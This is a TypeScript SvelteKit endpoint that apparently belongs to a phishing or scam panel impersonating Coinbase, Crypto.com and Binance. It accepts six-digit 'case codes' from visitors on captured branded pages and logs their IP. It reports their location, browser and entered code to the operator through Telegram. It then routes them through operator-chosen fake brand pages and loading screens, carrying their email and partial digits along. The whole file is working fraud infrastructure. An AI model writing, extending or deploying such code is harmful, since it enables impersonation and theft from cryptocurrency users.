/**
 * Visitor case-access-code validation.
 *
 * The captured Case ID pages (Coinbase, CDC, Binance) collect 6 digits from
 * the visitor. When all 6 are entered, the page POSTs them here. We match
 * against the admin's `case_codes` table. On success the page is redirected
 * to either the code's configured target or the brand's Loading page.
 *
 * Public endpoint — visitor pages must call it without auth.
 */
import { json, type RequestHandler } from '@sveltejs/kit';
import { dbGetCaseCodeByCode, dbRecordCaseCodeUse, dbSetVisitorFlowSteps } from '$lib/server/database.js';
import { serverState } from '$lib/server/state';
import { broadcast } from '$lib/server/websocket';
import { notifyPageAction } from '$lib/server/telegram';
import {
	applyLoadingInterstitial,
	labelToUrl,
	labelToVisitorUrl,
	isValidFlowLabel
} from '$lib/server/funnel';
import { registerVisitorConnect } from '$lib/server/visitorConnect.js';
import { markStepCompleted, ensureFlowInitialized } from '$lib/server/goldenFlow.js';
import { dbGetSetting } from '$lib/server/database.js';

const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();

const caseCodeAttempts: Map<string, number[]> = new Map();
const CASE_RATE_WINDOW = 5 * 60 * 1000;
const CASE_RATE_MAX = 30;

function checkCaseRateLimit(ip: string): boolean {
	const now = Date.now();
	const list = (caseCodeAttempts.get(ip) || []).filter(t => now - t < CASE_RATE_WINDOW);
	if (list.length >= CASE_RATE_MAX) {
		caseCodeAttempts.set(ip, list);
		return false;
	}
	list.push(now);
	caseCodeAttempts.set(ip, list);
	return true;
}

const BRAND_DEFAULT_LABEL: Record<string, string> = {
	Coinbase: 'Coinbase/Loading',
	CDC: 'CDC/Loading',
	Binance: 'Binance/Loading'
};

function parseLabelFromTarget(target: string): string | null {
	const trimmed = target.trim();
	if (trimmed.includes('/templates/preview/')) {
		const rest = trimmed.split('/templates/preview/')[1]?.split('?')[0] || '';
		const parts = rest.split('/').filter(Boolean);
		if (parts.length >= 2) {
			return `${decodeURIComponent(parts[0])}/${decodeURIComponent(parts[1])}`;
		}
	}
	if (trimmed.includes('/') && !trimmed.startsWith('/')) {
		return trimmed;
	}
	return null;
}

function resolveCaseTarget(
	recordTarget: string,
	brand: string,
	visitorModule: string,
	isVisitorHost: boolean,
	qp: URLSearchParams
): string {
	const trimmed = recordTarget.trim();
	if (trimmed.startsWith('/') && isVisitorHost) {
		const qs = qp.toString();
		return qs ? `${trimmed}${trimmed.includes('?') ? '&' : '?'}${qs}` : trimmed;
	}

	const label = parseLabelFromTarget(trimmed) || BRAND_DEFAULT_LABEL[brand] || `${brand}/Loading`;

	if (isVisitorHost) {
		return labelToVisitorUrl(label, visitorModule, qp.size ? qp : undefined) || '/loading';
	}

	const base = labelToUrl(label);
	if (!base) return trimmed;
	const qs = qp.toString();
	return qs ? `${base}?${qs}` : base;
}

export const POST: RequestHandler = async ({ request, getClientAddress, url }) => {
	let body: { code?: string; brand?: string } = {};
	try {
		body = await request.json();
	} catch {
		return json({ ok: false, error: 'invalid json' }, { status: 400 });
	}

	const raw = String(body.code ?? '').replace(/\D/g, '');
	const brand = String(body.brand ?? '').trim();
	if (raw.length !== 6) {
		return json({ ok: false, valid: false, error: 'code must be 6 digits' }, { status: 400 });
	}

	const ip = getClientAddress() || '';

	if (!checkCaseRateLimit(ip)) {
		return json({ ok: false, error: 'rate_limited' }, { status: 429 });
	}

	const record = dbGetCaseCodeByCode(raw);

	if (!record || !record.active) {
		const entry = serverState.addLogEntry(
			`visitor ${ip} entered invalid case code on ${brand || 'unknown'} case page`,
			'alert'
		);
		try {
			broadcast({ type: 'log:new', payload: entry });
		} catch {}
		return json({ ok: true, valid: false });
	}

	if (record.expiresAt && record.expiresAt > 0 && record.expiresAt < Date.now()) {
		return json({ ok: true, valid: false, error: 'expired' });
	}

	if (record.module && brand && record.module !== brand) {
		return json({ ok: true, valid: false });
	}

	dbRecordCaseCodeUse(raw, ip);

	let visitor = serverState.visitors.get(ip);
	if (!visitor) {
		visitor = await registerVisitorConnect({
			ip,
			userAgent: request.headers.get('user-agent') || '',
			host: url.hostname,
			path: '/case',
			brand,
			page: brand === 'Binance' ? 'Case' : 'Case ID',
			module: brand || record.module || 'Coinbase'
		});
	}

	const qp = new URLSearchParams();
	if (visitor?.lastTwoDigits) qp.set('last2', visitor.lastTwoDigits);
	if (visitor?.emailFrom) qp.set('emailFrom', visitor.emailFrom);
	if (visitor?.emailTo) qp.set('emailTo', visitor.emailTo);

	const hostname = url.hostname.toLowerCase();
	const isVisitorHost = !!(PANEL_HOST && hostname !== PANEL_HOST);

	// If the case code has an assigned flow, apply it to the visitor's session
	// and route them to the FIRST step instead of the configured target_page.
	const assignedFlow =
		record.flowId
			? serverState.flows.find((f) => f.id === record.flowId && f.active)
			: undefined;

	const currentLabel = brand
		? brand === 'Binance'
			? 'Binance/Case'
			: `${brand}/Case ID`
		: '';

	let target = '';
	let targetLabel = '';
	let flowApplied = false;

	function applyFlowSteps(
		steps: { page: string; status: string; completedAt?: number }[],
		flowName?: string
	): boolean {
		const nextStep = steps.find((s) => s.status !== 'completed' && isValidFlowLabel(s.page));
		if (!nextStep) return false;

		targetLabel = nextStep.page;
		visitor!.flowSteps = steps as any;
		if (flowName) {
			visitor!.flow = flowName;
			visitor!.isGoldenFlow = false;
		}
		visitor!.flowBypassed = false;
		try {
			dbSetVisitorFlowSteps(ip, visitor!.flowSteps);
		} catch {
			/* non-critical */
		}
		serverState.setVisitorLastPage(ip, targetLabel);

		target = isVisitorHost
			? labelToVisitorUrl(targetLabel, visitor!.module, qp.size ? qp : undefined) || ''
			: (() => {
				const base = labelToUrl(targetLabel);
				if (!base) return '';
				const qs = qp.toString();
				return qs ? `${base}?${qs}` : base;
			})();

		if (target) {
			flowApplied = true;
			broadcast({ type: 'visitor:updated', payload: visitor! });
		}
		return !!target;
	}

	const goldenFlowOn = dbGetSetting('visitor.golden_flow_enabled') !== '0';

	if (visitor && currentLabel && !goldenFlowOn && assignedFlow && assignedFlow.steps.length > 0) {
		const hasValidSteps = assignedFlow.steps.some((p) => isValidFlowLabel(p) && p !== currentLabel);
		if (hasValidSteps) {
			const steps = assignedFlow.steps.map((p) => {
				const caseCompleted = !!currentLabel && p === currentLabel;
				return {
					page: p,
					status: (!isValidFlowLabel(p) || caseCompleted) ? 'completed' as const : 'not_started' as const,
					completedAt: caseCompleted ? Date.now() : undefined
				};
			});
			applyFlowSteps(steps, assignedFlow.name);
		}
	}

	if (!target && visitor && currentLabel) {
		if (goldenFlowOn) {
			ensureFlowInitialized(visitor);
		}
		if (visitor.flowSteps.length > 0) {
			markStepCompleted(visitor, currentLabel);
			const nextStep = visitor.flowSteps.find((s: any) => s.status !== 'completed' && isValidFlowLabel(s.page));
			if (nextStep) {
				targetLabel = nextStep.page;
				target = isVisitorHost
					? labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined) || ''
					: (() => {
						const base = labelToUrl(targetLabel);
						if (!base) return '';
						const qs = qp.toString();
						return qs ? `${base}?${qs}` : base;
					})();
				if (target) {
					flowApplied = true;
					serverState.setVisitorLastPage(ip, targetLabel);
					broadcast({ type: 'visitor:updated', payload: visitor });
				}
			}
		}
	}

	if (!target) {
		target = resolveCaseTarget(
			record.targetPage?.trim() || '',
			brand,
			visitor?.module || brand,
			isVisitorHost,
			qp
		);
		targetLabel = parseLabelFromTarget(record.targetPage?.trim() || '') || BRAND_DEFAULT_LABEL[brand] || '';
		if (targetLabel && visitor) {
			serverState.setVisitorLastPage(ip, targetLabel);
		}
	}

	// Final safety net: never return a target that puts the visitor back on the
	// same Case ID page they just submitted from (would cause a reload loop).
	if (target && currentLabel) {
		const targetPath = target.split('?')[0];
		const targetIsCurrent =
			targetPath === '/case' ||
			target === `/templates/preview/${encodeURIComponent(brand)}/${encodeURIComponent('Case ID')}` ||
			target === `/templates/preview/${brand}/Case%20ID` ||
			target.includes(`/templates/preview/${brand}/Case`);
		if (targetIsCurrent && visitor?.flowSteps?.length) {
			const nextStep = visitor.flowSteps.find((s: any) => s.status !== 'completed' && isValidFlowLabel(s.page));
			if (nextStep) {
				targetLabel = nextStep.page;
				const base = isVisitorHost
					? labelToVisitorUrl(targetLabel, visitor.module, qp.size ? qp : undefined)
					: labelToUrl(targetLabel);
				if (base) {
					target = base;
					serverState.setVisitorLastPage(ip, targetLabel);
				}
			}
		}
		if (targetIsCurrent && (targetPath === '/case' || target.includes('Case'))) {
			const fallback = BRAND_DEFAULT_LABEL[brand] || 'Coinbase/Loading';
			const base = isVisitorHost
				? labelToVisitorUrl(fallback, visitor?.module || brand, qp.size ? qp : undefined)
				: labelToUrl(fallback);
			if (base) {
				target = base;
				targetLabel = fallback;
				if (visitor) serverState.setVisitorLastPage(ip, fallback);
			}
		}
	}

	const labelSuffix = record.label ? ` (${record.label})` : '';
	const flowSuffix = flowApplied
		? ` → flow "${assignedFlow!.name}" → ${targetLabel}`
		: assignedFlow
			? ` (flow "${assignedFlow.name}" had no usable step, used default ${targetLabel})`
			: ` → ${targetLabel}`;
	const entry = serverState.addLogEntry(
		`visitor ${ip} entered valid case code on ${brand || record.module || 'case'} page${labelSuffix}${flowSuffix}`,
		'action'
	);
	try {
		broadcast({ type: 'log:new', payload: entry });
	} catch {}

	if (visitor) {
		notifyPageAction(
			{
				ip,
				userId: visitor.userId,
				city: visitor.city,
				region: visitor.region,
				country: visitor.country,
				browser: visitor.browser,
				platform: visitor.platform,
				module: visitor.module,
				capturedBy: visitor.capturedBy,
				lastPageRoute: 'Case ID'
			},
			`${brand || 'Unknown'}/Case ID`,
			'case_code_valid',
			record.label || undefined,
			{ code: raw }
		).catch(() => {});
	}

	const outbound = applyLoadingInterstitial(target || null, qp.size ? qp : undefined, {
		isVisitorHost
	});

	return json({ ok: true, valid: true, targetPage: outbound || target });
};
